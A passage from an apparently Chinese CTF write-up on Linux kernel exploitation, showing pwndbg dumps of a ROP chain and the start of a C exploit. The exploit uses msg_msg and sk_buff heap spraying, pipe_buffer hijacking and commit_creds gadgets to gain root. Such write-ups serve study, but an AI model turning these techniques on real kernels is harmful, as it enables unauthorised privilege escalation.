class="line">──────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► <span class="number">0xffffffff8e0dbede</span>    push   rsi</span><br><span class="line">   <span class="number">0xffffffff8e0dbedf</span>    pop    rsp</span><br><span class="line">   <span class="number">0xffffffff8e0dbee0</span>    test   edx, edx</span><br><span class="line">   <span class="number">0xffffffff8e0dbee2</span>    jle    <span class="number">0xffffffff8e0dbf88</span>            &lt;<span class="number">0xffffffff8e0dbf88</span>&gt;</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0xffffffff8e0dbf88</span>    ud2    </span><br><span class="line">   <span class="number">0xffffffff8e0dbf8a</span>    mov    eax, <span class="number">0xffffffea</span></span><br><span class="line">   <span class="number">0xffffffff8e0dbf8f</span>    jmp    <span class="number">0xffffffff8e0dbf2c</span>            &lt;<span class="number">0xffffffff8e0dbf2c</span>&gt;</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0xffffffff8e0dbf2c</span>    pop    rbx</span><br><span class="line">   <span class="number">0xffffffff8e0dbf2d</span>    pop    r12</span><br><span class="line">   <span class="number">0xffffffff8e0dbf2f</span>    pop    r13</span><br><span class="line">   <span class="number">0xffffffff8e0dbf31</span>    pop    rbp</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp <span class="number">0xffffa3aa004e3dc8</span> —▸ <span class="number">0xffffffff8e1275fb</span> ◂— add    ebx, <span class="number">1</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0xffffa3aa004e3dd0</span> —▸ <span class="number">0xffff9799c22feee0</span> ◂— adc    byte ptr [rcx], <span class="number">4</span> <span class="comment">/* 0x3e800041180 */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0xffffa3aa004e3dd8</span> —▸ <span class="number">0xffff9799c285cd80</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│ rbp <span class="number">0xffffa3aa004e3de0</span> —▸ <span class="number">0xffffa3aa004e3e08</span> —▸ <span class="number">0xffffa3aa004e3e30</span> —▸ <span class="number">0xffffa3aa004e3e68</span> —▸ <span class="number">0xffffa3aa004e3e78</span> ◂— ...</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0xffffa3aa004e3de8</span> —▸ <span class="number">0xffffffff8e12769c</span> ◂— pop    rbx</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│     <span class="number">0xffffa3aa004e3df0</span> —▸ <span class="number">0xffff9799c32d8c00</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│     <span class="number">0xffffa3aa004e3df8</span> —▸ <span class="number">0xffff9799c285cd80</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│     <span class="number">0xffffa3aa004e3e00</span> —▸ <span class="number">0xffff9799c22feee0</span> ◂— adc    byte ptr [rcx], <span class="number">4</span> <span class="comment">/* 0x3e800041180 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>寄存器 RSI 中就是我们布置的 ROP 链</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0xffff9799c2864800</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsi <span class="number">0xffff9799c2864800</span> ◂— jns    <span class="number">0xffff9799c286486a</span> <span class="comment">/* 0x776f6c6c656879; &#x27;yhellow&#x27; */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0xffff9799c2864808</span> —▸ <span class="number">0xffff9799c2864800</span> ◂— jns    <span class="number">0xffff9799c286486a</span> <span class="comment">/* 0x776f6c6c656879; &#x27;yhellow&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0xffff9799c2864810</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0xffff9799c2864818</span> ◂— <span class="number">0x3d0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0xffff9799c2864820</span> —▸ <span class="number">0xffffffff8de938f0</span> ◂— pop    rdi</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│     <span class="number">0xffff9799c2864828</span> —▸ <span class="number">0xffffffff8fa6d580</span> ◂— <span class="number">4</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│     <span class="number">0xffff9799c2864830</span> —▸ <span class="number">0xffffffff8ded25c0</span> ◂— nop    dword ptr [rax + rax]</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│     <span class="number">0xffff9799c2864838</span> —▸ <span class="number">0xffffffff8ea01006</span> ◂— mov    rdi, rsp</span><br><span class="line">pwndbg&gt; </span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0xffff9799c2864840</span> ◂— jns    <span class="number">0xffff9799c28648aa</span> <span class="comment">/* 0x776f6c6c656879; &#x27;yhellow&#x27; */</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│  <span class="number">0xffff9799c2864848</span> ◂— jns    <span class="number">0xffff9799c28648b2</span> <span class="comment">/* 0x776f6c6c656879; &#x27;yhellow&#x27; */</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│  <span class="number">0xffff9799c2864850</span> —▸ <span class="number">0x401e87</span> ◂— push   rbp</span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│  <span class="number">0xffff9799c2864858</span> ◂— <span class="number">0x33</span> <span class="comment">/* &#x27;3&#x27; */</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│  <span class="number">0xffff9799c2864860</span> ◂— <span class="number">0x246</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│  <span class="number">0xffff9799c2864868</span> —▸ <span class="number">0x7fffe7eb2ad0</span> —▸ <span class="number">0x7fffe7eb7400</span> —▸ <span class="number">0x403950</span> ◂— endbr64 </span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│  <span class="number">0xffff9799c2864870</span> ◂— <span class="number">0x2b</span> <span class="comment">/* &#x27;+&#x27; */</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│  <span class="number">0xffff9799c2864878</span> ◂— <span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>完整 exp：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRIMARY_MSG_SIZE 96</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECONDARY_MSG_SIZE 0x400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRIMARY_MSG_TYPE    0x41</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECONDARY_MSG_TYPE  0x42</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> VICTIM_MSG_TYPE     0x1337</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_TAG     0xAAAAAAAA</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SOCKET_NUM 16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SK_BUFF_NUM 128</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PIPE_NUM 256</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_QUEUE_NUM 4096</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810d2ac0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INIT_CRED 0xffffffff82c6d580</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COMMIT_CREDS 0xffffffff810d25c0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00ff0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> POP_RDI_RET 0xffffffff810938f0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ANON_PIPE_BUF_OPS 0xffffffff8203fe40</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FREE_PIPE_INFO 0xffffffff81327570</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> POP_R14_POP_RBP_RET 0xffffffff81003364</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PUSH_RSI_POP_RSP_POP_4VAL_RET 0xffffffff812dbede</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CALL_RSI_PTR 0xffffffff8105acec</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="keyword">size_t</span> kernel_offset, kernel_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred, commit_creds, swapgs_restore_regs_and_return_to_usermode, init_cred;</span><br><span class="line"></span><br><span class="line"><span class="keyword">long</span> dev_fd;</span><br><span class="line"><span class="keyword">int</span> pipe_fd[<span class="number">2</span>], pipe_fd2[<span class="number">2</span>], pipe_fd_1;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * skb_shared_info need to take 320 bytes at the tail</span></span><br><span class="line"><span class="comment"> * so the max size of buf we should send is:</span></span><br><span class="line"><span class="comment"> * 1024 - 320 = 704</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">char</span> fake_secondary_msg[<span class="number">704</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0x1234</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">del</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0xdead</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">saveStatus</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span>    next;</span><br><span class="line">    <span class="keyword">uint64_t</span>    prev;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span>    m_type;</span><br><span class="line">    <span class="keyword">uint64_t</span>    m_ts;</span><br><span class="line">    <span class="keyword">uint64_t</span>    next;</span><br><span class="line">    <span class="keyword">uint64_t</span>    security;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span>    next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[PRIMARY_MSG_SIZE - <span class="keyword">sizeof</span>(struct msg_msg)];</span><br><span class="line">&#125;primary_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(struct msg_msg)];</span><br><span class="line">&#125;secondary_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg) + <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msgseg)];</span><br><span class="line">&#125; oob_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span>    page;</span><br><span class="line">    <span class="keyword">uint32_t</span>    offset, len;</span><br><span class="line">    <span class="keyword">uint64_t</span>    ops;</span><br><span class="line">    <span class="keyword">uint32_t</span>    flags;</span><br><span class="line">    <span class="keyword">uint32_t</span>    padding;</span><br><span class="line">    <span class="keyword">uint64_t</span>    <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span>    confirm;</span><br><span class="line">    <span class="keyword">uint64_t</span>    release;</span><br><span class="line">    <span class="keyword">uint64_t</span>    try_steal;</span><br><span class="line">    <span class="keyword">uint64_t</span>    get;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">readMsg</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="keyword">long</span>), msgtyp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">writeMsg</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *(<span class="keyword">long</span>*)msgp = msgtyp;</span><br><span class="line">    <span class="keyword">return</span> msgsnd(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="keyword">long</span>), <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">peekMsg</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="keyword">long</span>), msgtyp, MSG_COPY | IPC_NOWAIT); <span class="comment">// IPC_NOWAIT:若没有收到消息则立即返回-1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">buildMsg</span><span class="params">(struct msg_msg *msg, <span class="keyword">uint64_t</span> m_list_next,<span class="keyword">uint64_t</span> m_list_prev, <span class="keyword">uint64_t</span> m_type, <span class="keyword">uint64_t</span> m_ts, <span class="keyword">uint64_t</span> next, <span class="keyword">uint64_t</span> security)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    msg-&gt;m_list.next = m_list_next;</span><br><span class="line">    msg-&gt;m_list.prev = m_list_prev;</span><br><span class="line">    msg-&gt;m_type = m_type;</span><br><span class="line">    msg-&gt;m_ts = m_ts;</span><br><span class="line">    msg-&gt;next = next;</span><br><span class="line">    msg-&gt;security = security;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">spraySkBuff</span><span class="params">(<span class="keyword">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>], <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span 